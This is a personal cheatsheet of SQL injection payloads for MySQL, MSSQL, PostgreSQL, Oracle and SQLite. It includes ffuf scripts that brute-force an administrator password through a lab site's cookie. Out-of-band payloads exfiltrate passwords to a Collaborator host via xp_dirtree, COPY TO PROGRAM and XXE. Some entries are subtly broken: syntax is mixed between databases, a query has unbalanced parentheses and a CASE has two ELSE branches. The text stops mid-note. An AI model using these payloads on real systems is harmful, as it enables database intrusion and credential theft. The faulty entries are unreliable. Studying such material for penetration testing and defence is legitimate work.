---
created: 2026-07-07
sticker: lucide//syringe
tags:
  - cheatsheet
  - web_hacking
  - SQL
status: substantial
---
## Basic detection and commenting out

>[!tip]+
>If you suspect SQL injection but can't figure out how to confirm it and determine which type it is, use the SQL injection fuzzing wordlist in Burp Intruder.

- Attempt to break syntax:
	- `'`
	- `"`
	- `')`
	- `"))`
	- `1'`
	- `\`

- Look for differences in response (page content, length, status code, specific strings, redirects, etc.).

- Use comments to fix syntax (neutralizes the rest of the query):

| DBMS           | Inline comment                             | Block comment   |
| -------------- | ------------------------------------------ | --------------- |
| **MySQL**      | `-- comment` (space needed)<br>`# comment` | `/* comment */` |
| **MSSQL**      | `--comment`                                | `/* comment */` |
| **PostgreSQL** | `--comment`                                | `/* comment */` |
| **Oracle**     | `--comment`                                | `/* comment */` |
| **SQLite**     | `--comment`                                | `/* comment */` |

>[!tip]+ Always test `-- -` (dash-dash-space-dash). It guarantees the trailing whitespace MySQL needs.

- Inject a syntactically valid `true` (e.g., `' AND '1'='1`) and `false` (e.g., `' AND '1'='2`) payload, then compare responses (content, length, status, headers, redirects). See [[#Boolean-based blind (content changes)]].
- If no differences: try an OOB DNS canary. See [[#Out-of-Band (OOB) SQLi]].

>[!important] Always test all injectable parameters and HTTP headers (`X-Forwarded-For`, `User-Agent`, cookies, JSON body fields, `Referer`).

- Universal test strings:

```sql
'
"
')
"))
`
\
1' OR '1'='1
1" OR "1"="1
```

> [!tip]+ Decision tree
> - Does the response reflect query results directly?
> 	- If yes -> **In-band, error-based on `UNION`-based**.
> - Does the page content/length/status code change based on a `true`/`fals` condition, with no visible errors? 
> 	- If yes -> **Boolean-based blind**.
> - Does the application throw a distinguishable error (`500 Internal Server Error`, custom error page) or returns a response of a different length *only* under certain conditions?
> 	- If yes -> **Error-based blind** (conditional errors).
> - No content/error difference at all, but you can cause measurable differences in response time?
> 	- If yes -> **Time-based blind**.
> - No synchronous signal whatsoever (fire-and-forget processing, async workers, headless backends)?
> 	- If yes -> **Out-of-Band (OOB)**.

- Login bypass or tautology:
	- `' OR '1'='1' --`
	- `' OR 1=1 --`
	- `admin' --`
	- `admin' #`
	- `') OR ('1'='1`
## In-band SQL injection

### Error-based SQLi

#### MySQL

- `EXTRACTVALUE(xml_target, xpath_expr)` extracts text content from an XML string using an XPath expression. Invalid XPath expressions can be abused to leak data.

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))-- -
```

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='administrator' LIMIT 1)))-- -
```

>[!note] `0x7e` = hex for `~`, forces the XPath expression to start with an invalid character (guarantees the error fires).

- `UPDATEXML(xml_target, xpath_expr, new_xml)` modifies an XML string by replacing a node matched by an XPath expression with new XML content. Same trick as above: invalid XPath can be abused to leak data.

```sql
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1)-- -
```

```sql
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='administrator' LIMIT 1)), 1)-- -
```

>[!note] See [`XML Functions — MySQL documentation`](https://dev.mysql.com/doc/refman/9.7/en/xml-functions.html).

>[!important]+ 32-character output limit
>Both `EXTRACTVALUE()` and `UPDATEXML()` truncate the leaked value to ~32 characters. 
>
>For longer values, chunk with `SUBSTRING()`:
> ```sql
> ' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT password FROM users LIMIT 1),1,31)))-- -
> ```
> 
> ```sql
> ' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT password FROM users LIMIT 1),32,31)))-- -
> ```

>[!note] MySQL's `CAST`/`CONVERT` type mismatches usually **do not throw exceptions** by default (in a non-strict mode), only warnings (the string is silently truncated to `0`). Don't rely on casting for MySQL error-based; use the XPath functions instead.

#### MSSQL

- `CONVERT()`/`CAST()` failure messages often include the actual value that failed to convert:

```sql
' AND 1=CONVERT(int, (SELECT @@version))-- -
```

```sql
' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users WHERE username='admin'))-- -
```

```sql
' AND 1=CAST((SELECT version()) AS int)-- -
' AND 1=CAST((SELECT database()) AS unsigned)-- -
```

```sql
' AND 1=CAST((SELECT TOP 1 name FROM sys.tables) AS int)-- -
```

```sql
' AND CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)-- -
' AND CAST((SELECT password FROM users WHERE username='admin' LIMIT 1) AS int)-- -
```

#### PostgreSQL

```sql
' AND 1=CAST((SELECT version()) AS int)-- -
```

```sql
' AND 1=(SELECT CASE WHEN (1=1) THEN CAST((SELECT current_user) AS int) ELSE 1 END)-- -
```

> [!note]+ Legacy / privileged alternative
> `CTXSYS.DRITHSX.SN(user, subquery)` was historically used for Oracle error-based extraction, but requires `EXECUTE` on the `CTXSYS` package (Oracle Text) and has been restricted/removed in most current installations. Treat it as a legacy fallback only if you confirm the package is accessible:
> 
> ```sql
> ' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1))-- -
> ```
#### Oracle

- Numeric-conversion errors:

```sql
' AND 1=TO_NUMBER('~'||(SELECT banner FROM v$version WHERE rownum=1))--
```

```sql
' AND 1=TO_NUMBER('~'||(SELECT password FROM users WHERE username='admin' AND rownum=1))--
```

### `UNION`-based SQLi
#### Determining the number of columns

- **`ORDER BY`** (increment the column index until an error occurs):

```SQL
' ORDER BY 1-- -   -- valid
' ORDER BY 2-- -   -- valid
' ORDER BY 3-- -   -- valid
' ORDER BY 4-- -   -- error → 3 solumns
```
	
The **highest valid index** is the number of columns the original `SELECT` statement returns (→ `3` in this example).

- **`NULL`**: `UNION`-select `NULL` columns and increment until the query succeeds:

```SQL
' UNION SELECT NULL-- -            -- error
' UNION SELECT NULL,NULL-- -       -- valid → 2 columns
' UNION SELECT NULL,NULL,NULL-- -  -- error
```
	
The number of `NULL`s in the valid query is the number of columns returned by the original `SELECT` statement (→ `2` here).

>[!important]+ Oracle requires `FROM dual`
>- Before **Oracle 23c**, every `SELECT` statement needs a `FROM` clause. If a query doesn't reference actual tables, `FROM dual` is required.
>```sql
>' UNION SELECT NULL FROM dual--
>' UNION SELECT NULL,NULL FROM dual--
>```
>- **Starting with Oracle 23c**, the `FROM DUAL` clause is **no longer required** for queries that do not reference actual tables (e.g., `SELECT NULL,NULL` is valid).

> [!tip]- Type-mismatch errors on `NULL` 
> If a `UNION SELECT NULL,...` still errors even with the right column count, a strongly-typed column (e.g., a `DATE` column in Oracle, or a Postgres column that can't infer `NULL`'s type) may be rejecting an untyped `NULL`. Cast it explicitly:
> 
> ```sql
> ' UNION SELECT NULL,CAST(NULL AS VARCHAR2(4000)),NULL FROM dual-- -   -- Oracle
> ' UNION SELECT NULL,NULL::text,NULL-- -                               -- PostgreSQL
> ```
#### Finding string-compatible columns

- Start with the correct number of `NULL` columns.
- Replace each `NULL` with a test string (`'a'`), one at a time. 

```SQL
' UNION SELECT 'a',NULL,NULL,NULL-- -   -- error
' UNION SELECT NULL,'a',NULL,NULL-- -   -- valid → column 2 accepts strings
' UNION SELECT NULL,'a','a',NULL-- -    -- error
' UNION SELECT NULL,'a',NULL,'a'-- -    -- valid → column 4 accepts strings
```
#### Extracting data

- Confirm you can extract meaningful data:

```sql
-- MySQL/MSSQL
' UNION SELECT NULL,@@version,NULL,database(),NULL-- -
```

```sql
-- PostgreSQL
' UNION SELECT NULL,version(),NULL,current_database(),NULL--
```

```sql
-- Oracle
' UNION SELECT NULL,banner,NULL,NULL,NULL FROM v$version WHERE rownum=1--
```

```sql
-- SQLite
' UNION SELECT NULL,sqlite_version(),NULL,NULL--
```

- Enumerate schema (see [[#Enumerating schema]] for the full reference):

```sql
-- MySQL/PostgreSQL/MSSQL — information_schema
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='webapp_db'-- -
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
```

```sql
-- Oracle — data dictionary views (names are UPPERCASE by default)
' UNION SELECT NULL,table_name,NULL FROM all_tables WHERE ROWNUM<=50--
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

```sql
-- SQLite — sqlite_master
' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'-- -
```

- Extract the actual data:

```sql
' UNION SELECT NULL,username,NULL FROM users-- -
' UNION SELECT NULL,password,NULL FROM users-- -
```

>[!tip]+ Only one column accepts string data? Concatenate.
> 
> ```sql
> -- MySQL
> UNION SELECT NULL,CONCAT(username,0x7e,password),NULL FROM users-- -
> ```
> 
> ```sql
> -- MSSQL
> UNION SELECT NULL,username+'~'+password,NULL FROM users--
> ```
> 
> ```sql
> -- PostgreSQL/Oracle/SQLite
> UNION SELECT NULL,username||'~'||password,NULL FROM users--
> ```

### Stacked queries

- Test for stacked queries:

```sql
'; SELECT 1-- -
```

| DBMS           | Supported?                                                                                                                                                                                                            | Terminator |
| -------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------- |
| **MySQL**      | Yes — but only if the application uses a multi-statement–capable API (e.g., `mysqli::multi_query`). <br>Default single-statement APIs (most `mysqli`/PDO usage) will **not** execute a second statement (check this). | `;`        |
| **MSSQL**      | Yes — nearly all common drivers (ADO.NET, ODBC, JDBC) execute batches by default.                                                                                                                                     | `;`        |
| **PostgreSQL** | Yes — the simple query protocol executes semicolon-separated statements; most drivers (`psycopg2`, `node-postgres` w/ `query()`) allow it.                                                                            | `;`        |
| **Oracle**     | **No** — Oracle's OCI/JDBC interfaces enforce one top-level statement per execute call (but worth testing for PL/SQL injection).                                                                                      | `;`        |
| **SQLite**     | Depends on the binding: the C `sqlite3_exec()` API allows multiple statements; many language wrappers (e.g. Python's `sqlite3.execute()`) restrict to one and require `executescript()`.                              | `;`        |
>[!tip] Stacked queries turn injection into arbitrary [DML](https://en.wikipedia.org/wiki/Data_manipulation_language)/[DDL](https://en.wikipedia.org/wiki/Data_definition_language) and — combined with `xp_cmdshell` (MSSQL) or `COPY ... TO PROGRAM` (PostgreSQL) — potential RCE.
## Blind SQLi

### Boolean-based blind (content changes)

#### Detection

Observe if the page/content changes based on `true` (normal/success)/`false` (different or empty response, error page) conditions.

- **True** payloads (expect normal/success response): 
	- `' AND 1=1-- -` 
	- `' AND '1'='1`
	- `') AND (1=1)-- -`
	- `" AND "1"="1`
- **False** payloads (expect different/empty response, error page):
	- `' AND 1=0-- -`
	- `' AND '1'='2`

- If `true`/`false` changes behavior consistently -> confirmed boolean-based blind SQLi.

```sql
' AND 1=1-- -
' AND '1'='1
' OR 1=1-- -
" AND "1"="1
AND 1=1# (MySQL)
1' AND '1'='1
' OR (1=1 AND 2=2)--
```
#### Extracting data

- **Existence checks**:

```sql
-- table
' AND (SELECT 'a' FROM users LIMIT 1)='a
```

```sql
-- username column / target user
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
' AND (SELECT COUNT(*) FROM users WHERE username='administrator')>0--
```

```sql
-- password column / its length is more than 1
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'p%')=1--
```

- **Determine string length**:

```sql
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20-- -
```

```sql
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>10-- -
```

>[!tip] Binary search is faster than just incrementing `=` values.

- **Extracting character-by-character**:

```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a
```

```sql
-- binary search via ordering
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)>'m'
```

```sql
-- ASCII binary search
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))>109
```

>[!tip]+ To print ASCII table in the terminal: `man ascii`.


| DBMS           | Syntax                                                                                    | Example                                       |
| -------------- | ----------------------------------------------------------------------------------------- | --------------------------------------------- |
| **MySQL**      | `SUBSTRING(string, position, length)`                                                     | `SELECT SUBSTRING('string', 3, 4);` -> `ring` |
| **MSSQL**      | `SUBSTRING(string, position, length)`                                                     | `SELECT SUBSTRING('string', 3, 4);` -> `ring` |
| **PostgreSQL** | `SUBSTRING(string, position, length)` or <br>`SUBSTRING(string FROM position FOR length)` | `SELECT SUBSTRING('string', 3, 4);` -> `ring` |
| **Oracle**     | `SUBSTR(string, position, length)`                                                        | `SELECT SUBSTR('string', 3, 4);` -> `ring`    |
| **SQLite**     | `SUBSTR(string, position, length)`                                                        | `SELECT SUBSTR('string', 3, 4);` -> `ring`    |

> [!note] All of these use **`1`-based** indexing (the first character is at position `1`, not `0`).

- **Extracting characters using `LIKE` patterns**:

```sql
-- count users starting with 'a'
' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%')>5-- -
```

```sql
-- confirm admin* user exists
' AND (SELECT 'a' FROM users WHERE username LIKE 'admin%')='a'-- -
```

```sql
-- extract password character-by-character
' AND SUBSTRING((SELECT password FROM users WHERE username LIKE 'adm%'),1,1)='s'-- -
```
##### Automating with `ffuf`

- Single character:

```bash
ffuf -k \
	-u 'https://example.com/' \
	-b "TrackingId=x' AND (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='FUZZ" \
	-b "session=2pOFCSp5aUlhx03q8LzONvlBjwbeFcG1" \
	-w chars.txt \
	-mr "Welcome" -s
```

- Full password loop:

```bash
#!/bin/bash

URL="https://example.com/"
SESSION="session=2pOFCSp5aUlhx03q8LzONvlBjwbeFcG1"

PASSWORD=""

for pos in $(seq 1 20); do
  echo -ne "[+] Position $pos: \t"

  CHAR=$(ffuf -k -s \
    -u "$URL" \
    -b "TrackingId=x' AND (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(password,${pos},1)='FUZZ')='a" \
    -b "${SESSION}" \
    -w chars.txt \
    -mr "Welcome" \
    | awk '{print $NF}')

  PASSWORD+=$CHAR
  echo "$CHAR"
done
echo "[+] Final password: $PASSWORD"
```

>[!burp] Use **Cluster bomb** with two payload sets: position (Numbers, `1`-`20`) and character (simple list of printable characters; check the application's password policy).

### Time-based blind

#### Testing for delay

- **True** delay payloads (expect 5-10s slower response):

```sql
-- MySQL
' AND SLEEP(5)-- -
```

```sql
-- NSSQL
'; WAITFOR DELAY '0:0:5'--
```

```sql
'; SELECT pg_sleep(5)--
```

```sql
-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

- Measure response time:
	- Use Burp Repeater (look at response time).
	- `time curl ...` or browser DevTools.
	- Consistent delay on `true` + no delay on `false` = vulnerable.

- **Delay functions per DBMS**:

| DBMS           | Syntax                                                                                                             | Example (~10-second delay)                                                                              |
| -------------- | ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------- |
| **MySQL**      | `SLEEP(seconds)` or<br>`BENCHMARK(count, expression)`                                                              | `SLEEP(10)`<br>`BENCHMARK(50000000, MD5('test'))`                                                       |
| **PostgreSQL** | `pg_sleep(seconds)`                                                                                                | `pg_sleep(10)`                                                                                          |
| **MSSQL**      | `WAITFOR DELAY 'hh:mm:ss'`                                                                                         | `WAITFOR DELAY '0:0:10'`                                                                                |
| **Oracle**     | `DBMS_PIPE.RECEIVE_MESSAGE('a', seconds)` *(public by default)*<br>`DBMS_LOCK.SLEEP(seconds)` *(needs privileges)* | `DBMS_PIPE.RECEIVE_MESSAGE('a',10)`                                                                     |
| **SQLite**     | — *(no native sleep; use  heavy query)*                                                                            | `WITH RECURSIVE r(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM r WHERE x<10000000) SELECT count(*) FROM r` |
#### Conditional delays

- MySQL:

```sql
-- true, delay
' AND IF(1=1, SLEEP(5), 0)--
```

```sql
-- control: false, no delay
' AND IF(1=2, SLEEP(5), 0)--
```

```sql
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='p', SLEEP(5), 0)--
```

- MSSQL:

```sql
-- true, delay
'; IF(1=1) WAITFOR DELAY '0:0:5'--
```

```sql
-- control: false, no delay
'; IF(1=2) WAITFOR DELAY '0:0:5'--
```

```sql
'; IF (SELECT COUNT(*) FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='a')=1 WAITFOR DELAY '0:0:5'--
```

- PostgreSQL:

```sql
-- true, delay
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
```

```sql
-- control: false, no delay
'; SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
```

- Oracle:

```sql
-- true, delay
' AND 1=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END)-- -
```

```sql
-- control: false, no delay
' AND 1=(CASE WHEN (1=2) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END)-- -
```


```sql
' AND 1=(CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END)-- -
```

- SQLite (heavy queries):

```sql
-- true, delay
' AND (SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM (WITH RECURSIVE r(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM r WHERE x<5000000) SELECT x FROM r)) ELSE 0 END)--
```

```sql
-- control: false, no delay
' AND (SELECT CASE WHEN (1=2) THEN (SELECT COUNT(*) FROM (WITH RECURSIVE r(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM r WHERE x<5000000) SELECT x FROM r)) ELSE 0 END)--
```

```sql
' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a') THEN (SELECT COUNT(*) FROM (WITH RECURSIVE r(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM r WHERE x<5000000) SELECT x FROM r)) ELSE 0 END)-- -
```
#### Extracting data using conditional delays
##### Determining string length

- MySQL:

```sql
' AND IF(LENGTH(SELECT password FROM users WHERE username='administrator'))=20, SLEEP(5), 0)--
```

- PostgreSQL:

```sql
'; SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator')))=20 THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

>[!note]+ Double parentheses
>The above query uses double parentheses around the `SELECT` statement:
>- Inner parentheses tells SQL to evaluate the subquery as a single scalar value (the password string): `(SELECT password FROM users WHERE username='administrator')`.
>- Outer parentheses pass the subquery to the `LENGTH()` function: `LENGTH((SELECT password ...))`.
##### Extracting characters

- MySQL:

```sql
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a', SLEEP(5), 0)-- -
```

```sql
' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))>109, SLEEP(5), 0)-- -
```

- PostgreSQL:

```sql
'; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

```sql
'; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator') FROM 1 FOR 1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

> [!warning]+ Concurrency will destroy your timing signal 
> >[!burp] In Burp Intruder, set `Resource Pool` → `Maximum concurrent requests = 1` for time-based attacks. Parallel requests queue on the DB connection pool and produce false delays. For serious time-based automation, use **Turbo Intruder** (single-threaded, precise `time.time()` measurement per request).

### Error-based blind (conditional errors)

##### Detection

Error-based blind SQLi is used when the application does not show content differences (boolean) or reliable time delays, but does produce a detectable difference when a database error occurs (e.g., custom error page, HTTP `500`, different response length, or suppressed-but-detectable error).

You construct queries that **trigger an error only on `true` (or `false`)** conditions, then infer data from whether the error happened.

- **Confirm errors can be triggered/suppressed**:

```sql
-- confirm break
'
```

```sql
-- error disappears (valid query)
' AND 1=1-- -              
```

```sql
-- unconditional error (divide by zero)
' AND 1/0-- -
' AND CAST('a' AS int)--
```

##### Conditional errors

- MySQL:

```sql
' AND 1=(SELECT IF(1=1, 1, 1/0))--
```

- MSSQL:

```sql
' AND CASE WHEN (1=1) THEN 1 ELSE 1/0 END--
```

```sql
' AND 1=CONVERT(int, CASE WHEN (1=1) THEN 1 ELSE (SELECT @@version) END)-- -     -- true → no error
' AND 1=CONVERT(int, CASE WHEN (1=2) THEN 1 ELSE (SELECT @@version) END)-- -     -- false → conversion error
```

- PostgreSQL:

```bash
' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)--
```
```bash
' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/(SELECT 0) ELSE NULL END)--
```

- Oracle:

```sql
' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE 1/0 END FROM DUAL)='a'--
```

##### Error-based blind inside string concatenation (Oracle)

If the injection point is inside a string, you can **close the string and concatenate a subquery directly**. 
Examples below work in Oracle.

- Test existence of the `users` table (normal response -> table exists):

```sql
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

- Determine column length:

```sql
'||(SELECT CASE WHEN LENGTH(password)=20 THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'
```

- Extract characters:

```sql
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'
```

- Automate with `ffuf`:

```bash
ffuf -k -u 'https://0ac30091031d04cb804f0dea006b00ab.web-security-academy.net/filter?category=Gifts' \
	-b "TrackingId=xDCXIXKFkklcrZ8O'||(SELECT CASE WHEN SUBSTR(password,1,1)='FUZZ' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'" \
	-b "session=Y2vHlWUTE9qvvk67EXMwbmFwWYSamzJw" \
	-w chars.txt -c -mc 200
```


```bash
#!/bin/bash

# loop from position 1 to 20
for i in {1..20}
do
  echo "Testing character at position $i..."
  /home/trigger/go/bin/ffuf -k -u 'https://0ac30091031d04cb804f0dea006b00ab.web-security-academy.net/filter?category=Gifts' \
    -b "TrackingId=xDCXIXKFkklcrZ8O'||(SELECT CASE WHEN SUBSTR(password,$i,1)='FUZZ' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'" \
    -b "session=Y2vHlWUTE9qvvk67EXMwbmFwWYSamzJw" \
    -w chars.txt -c -mc 200 -s
done
```

## Out-of-Band (OOB) SQLi

Instead of relying on the same channel (HTTP response), you force the database to make an outbound network connection (DNS, HTTP, SMB, etc.) to a server you control (such as Burp Collaborator). The data can even be exfiltrated directly inside the DNS query. Use this technique when one of the previous work.

#### MySQL (Windows servers only)

- SMB/UNC path:

```sql
SELECT LOAD_FILE('\\\\<collaborator_id>.oastify.com\\a')
```

```sql
SELECT 'a' INTO OUTFILE '\\\\<collaborator_id>.oastify.com\\a'
```

- Extract data:

```sql
SELECT (SELECT username||0x7e||password FROM users LIMIT 1) INTO OUTFILE '\\\\<collaborator_id>.oastify.com\\a'
```

>[!note] Requires `FILE` privilege, a non-restrictive `secure_file_priv`, and a Windows-hosted MySQL server (the UNC path triggers an SMB/DNS lookup that Linux MySQL won't attempt the same way).

#### MSSQL

- DNS lookup:

```sql
'; exec master..xp_dirtree '//<collaborator_id>.oastify.com/a'--
```

- Extract data:

```sql
'; declare @p varchar(1024); set @p=(SELECT password FROM users WHERE username='administrator'); exec('master..xp_dirtree "//'+@p+'.<collaborator_id>.oastify.com/a"')--
```


#### PostgreSQL

- DNS lookup:

```sql
'; copy (SELECT '') to program 'nslookup <collaborator_id>.oastify.com'--
```

- Extract data:

```sql
'; CREATE OR REPLACE FUNCTION f() RETURNS void AS $$
DECLARE p TEXT;
DECLARE c TEXT;
BEGIN
  SELECT (SELECT password FROM users WHERE username='administrator' LIMIT 1) INTO p;
  c := 'COPY (SELECT '''') TO PROGRAM ''nslookup ' || p || '.<collaborator_id>.oastify.com''';
  EXECUTE c;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT f();--
```

> [!note] `COPY ... TO PROGRAM` requires superuser or membership in the `pg_execute_server_program` role — confirm privilege level before relying on this in an engagement.
#### Oracle

- DNS lookup:

```sql
'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://<collaborator_id>.oastify.com/">%remote;]>'),'/l') FROM dual)||'
```

- Extract data:

```sql
x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.<collaborator_id>.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

- URL-encoded:

```sql
x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.<collaborator_id>.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

> [!note]+ Many Oracle CPU patches since 2014 restrict XXE-driven outbound requests by default. If the XML-entity technique fails on a patched instance, try (requires network ACL grant in 11gR2+):
> 
> ```sql
> SELECT UTL_INADDR.get_host_address('<collaborator_id>.oastify.com') FROM dual
> SELECT UTL_HTTP.request('http://<collaborator_id>.oastify.com/') FROM dual
> ```

- URL-encoded version

```sql
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//z77je73kgb4s5ezz6xhh1rwdb4hv5ntc.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
```
## DBMS syntax reference

### Statement terminators & stacking

| DBMS           | Terminator | Supported?                                                                                                                                                                                                            |
| -------------- | ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **MySQL**      | `;`        | Yes — but only if the application uses a multi-statement–capable API (e.g., `mysqli::multi_query`). <br>Default single-statement APIs (most `mysqli`/PDO usage) will **not** execute a second statement (check this). |
| **MSSQL**      | `;`        | Yes — nearly all common drivers (ADO.NET, ODBC, JDBC) execute batches by default.                                                                                                                                     |
| **PostgreSQL** | `;`        | Yes — the simple query protocol executes semicolon-separated statements; most drivers (`psycopg2`, `node-postgres` w/ `query()`) allow it.                                                                            |
| **Oracle**     | `;`        | **No** — Oracle's OCI/JDBC interfaces enforce one top-level statement per execute call (but worth testing for PL/SQL injection).                                                                                      |
| **SQLite**     | `;`        | Depends on the binding: the C `sqlite3_exec()` API allows multiple statements; many language wrappers (e.g. Python's `sqlite3.execute()`) restrict to one and require `executescript()`.                              |

### Comments

| DBMS           | Inline comment                             | Block comment   |
| -------------- | ------------------------------------------ | --------------- |
| **MySQL**      | `-- comment` (space needed)<br>`# comment` | `/* comment */` |
| **MSSQL**      | `--comment`                                | `/* comment */` |
| **PostgreSQL** | `--comment`                                | `/* comment */` |
| **Oracle**     | `--comment`                                | `/* comment */` |
| **SQLite**     | `--comment`                                | `/* comment */` |

>[!tip]+ Use `-- -` for comments
>- In MySQL,  `--` starts a comment only if it’s followed by a space or control character. 
>- `--comment` (no space) is **not** treated as comment. 
>- The `-- -` pattern guarantees a space and prevents the application from stripping trailing whitespaces. Safe to use universally.
### String concatenation

| DBMS           | Syntax                                                                                             |
| -------------- | -------------------------------------------------------------------------------------------------- |
| **MySQL**      | `'str' 'ing'` (adjacent literals, space) · `CONCAT('str','ing')` ·  `CONCAT_WS('sep','str','ing')` |
| **MSSQL**      | `'str' + 'ing'` · `CONCAT('str','ing')` · `CONCAT_WS('~','str','ing')` (-> `str~ing`)              |
| **PostgreSQL** | `'str' \| 'ing'` · `CONCAT('str','ing')` · `CONCAT_WS('sep','str','ing')` (-> `str~ing`)           |
| **Oracle**     | `'str' \| 'ing'` · `CONCAT('str','ing')` (2-arg only, no `CONCAT_WS`)                              |
| **SQLite**     | `'str' \| 'ing'`                                                                                   |


>[!note]+ `CONCAT()` vs. `CONCAT_WS()`
> 
> - `CONCAT('~','str','ing')` → `~string`.
> - `CONCAT_WS('~','st','ri', 'ng')` → `st~ri~ng` (the first argument is a separator; `NULL` are skipped).
### Substrings

| DBMS           | Syntax                                                                                    | Example                                       |
| -------------- | ----------------------------------------------------------------------------------------- | --------------------------------------------- |
| **MySQL**      | `SUBSTRING(string, position, length)`                                                     | `SELECT SUBSTRING('string', 3, 4);` -> `ring` |
| **MSSQL**      | `SUBSTRING(string, position, length)`                                                     | `SELECT SUBSTRING('string', 3, 4);` -> `ring` |
| **PostgreSQL** | `SUBSTRING(string, position, length)` or <br>`SUBSTRING(string FROM position FOR length)` | `SELECT SUBSTRING('string', 3, 4);` -> `ring` |
| **Oracle**     | `SUBSTR(string, position, length)`                                                        | `SELECT SUBSTR('string', 3, 4);` -> `ring`    |
| **SQLite**     | `SUBSTR(string, position, length)`                                                        | `SELECT SUBSTR('string', 3, 4);` -> `ring`    |

>[!note] All these functions use **`1`-based** indexing. Position `1` = first character (not `0` like in C).
#### Length 

| DBMS           | Length                                                                                               |
| -------------- | ---------------------------------------------------------------------------------------------------- |
| **MySQL**      | `LENGTH(str)` (bytes) · `CHAR_LENGTH(str)` (characters)                                              |
| **MSSQL**      | `LEN(str)` (characters, trims trailing spaces) · `DATALENGTH(str)` (bytes, includes trailing spaces) |
| **PostgreSQL** | `LENGTH(str)` · `CHAR_LENGTH(str)` · `CHARACTER_LENGTH(str)`                                         |
| **Oracle**     | `LENGTH(str)` (characters) · `LENGTHB(str)` (bytes)                                                  |
| **SQLite**     | `LENGTH(str)`                                                                                        |


>[!note]+ MySQL `LENGTH()` vs. `CHAR_LENGTH()`
